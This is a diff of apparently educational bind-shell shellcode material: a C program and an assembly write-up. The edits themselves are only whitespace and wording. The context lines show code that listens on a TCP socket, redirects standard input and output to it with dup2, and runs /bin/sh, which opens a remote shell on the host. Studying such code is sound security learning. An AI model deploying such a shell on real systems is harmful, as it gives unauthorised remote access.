@@ -37,7 +37,7 @@ int main()
 	// Listen on any interface
 	addr.sin_addr.s_addr = INADDR_ANY;
 
-    // Create the sock
+        // Create the sock
 	// AF_INET for IPv4
 	// SOCK_STREAM for TCP connection
 	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
@@ -52,9 +52,9 @@ int main()
 	int connfd = accept(sockfd, NULL, NULL);
 
 	for (int i = 0; i < 3; i++)
-    {
-        dup2(connfd, i);
-    }
+        {
+            dup2(connfd, i);
+        }
 
 	// Execute /bin/sh
 	execve("/bin/sh", NULL, NULL);
@@ -151,8 +151,8 @@ int 0x80        ;Go for it
 mov esi, eax    ;move accept return value in esi
 ```
 
-This part of the code will redirect the STDIN, STDOUT and STDERR into the socket:
-```
+This part of the code will use dup2 to redirect the STDIN, STDOUT and STDERR into the socket:
+```nasm
 ;for (int i = 0; i < 3; i++)
 ;{
 ;    dup2(connfd, i);
@@ -340,7 +340,7 @@ Here is the result:
 
 In order to test it, we can now used this return and add it to a C program which will execute our shellcode
 
-The C program source code (this code can be found at root directory named test_shellcode.c)
+The C program source code (this code can be found at root directory named 'test_shellcode.c')
 ```c
 #include<stdio.h>
 #include<string.h>
